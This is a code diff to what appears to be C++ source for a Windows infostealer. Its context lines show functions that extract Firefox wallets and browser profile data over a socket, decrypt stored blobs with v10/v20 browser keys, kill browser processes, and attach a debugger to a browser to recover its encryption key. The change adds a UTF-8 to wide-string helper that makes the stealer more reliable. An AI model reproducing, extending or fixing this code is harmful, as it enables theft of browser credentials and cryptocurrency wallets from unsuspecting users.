@@ -147,6 +147,16 @@ std::string to_narrow_string(const wchar_t* w_str) {
     return res;
 }
 
+std::wstring utf8_to_wstring(const std::string& str) {
+    if (str.empty()) return L"";
+    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
+    if (size <= 0) return L"";
+    std::wstring res(size, L'\0');
+    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
+    if (!res.empty() && res.back() == L'\0') res.pop_back();
+    return res;
+}
+
 std::string json_escape(const std::string& s) {
     std::ostringstream oss;
     for (auto c : s) {
@@ -246,7 +256,7 @@ void extract_firefox_wallets(SOCKET sock, const fs::path& profile_path, const st
 std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera);
 
 void kill_processes_by_name(const std::string& target_name) {
-    std::wstring target_name_w(target_name.begin(), target_name.end());
+    std::wstring target_name_w = utf8_to_wstring(target_name);
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot != INVALID_HANDLE_VALUE) {
         PROCESSENTRY32W pe; pe.dwSize = sizeof(PROCESSENTRY32W);
@@ -311,7 +321,7 @@ void run_recovery(SOCKET sock) {
         if (has_key && !config.has_abe) { extract_all_profiles_data(sock, {}, config, user_data_dir); continue; }
         if (!config.has_abe) { extract_all_profiles_data(sock, {}, config, user_data_dir); continue; }
         std::wstring exe_path = L"";
-        if (!config.process_name.empty()) exe_path = get_browser_exe_path(utf8_to_wide(config.process_name));
+        if (!config.process_name.empty()) exe_path = get_browser_exe_path(utf8_to_wstring(config.process_name));
         if (exe_path.empty()) {
             std::vector<std::wstring> search_roots = get_search_roots();
             for (const auto& rel_path : config.exe_paths) {
@@ -571,7 +581,7 @@ std::vector<uint8_t> debug_loop_get_key(uint32_t process_id, const BrowserConfig
             wchar_t buffer[MAX_PATH];
             if (GetFinalPathNameByHandleW(debug_event.u.LoadDll.hFile, buffer, MAX_PATH, 0)) {
                 std::wstring path = buffer;
-                std::wstring dll_name_w(config.dll_name.begin(), config.dll_name.end());
+                std::wstring dll_name_w = utf8_to_wstring(config.dll_name);
                 if (path.find(dll_name_w) != std::wstring::npos) {
                     dll_bases[debug_event.dwProcessId] = (size_t)debug_event.u.LoadDll.lpBaseOfDll;
                     if (target_rva == 0) {
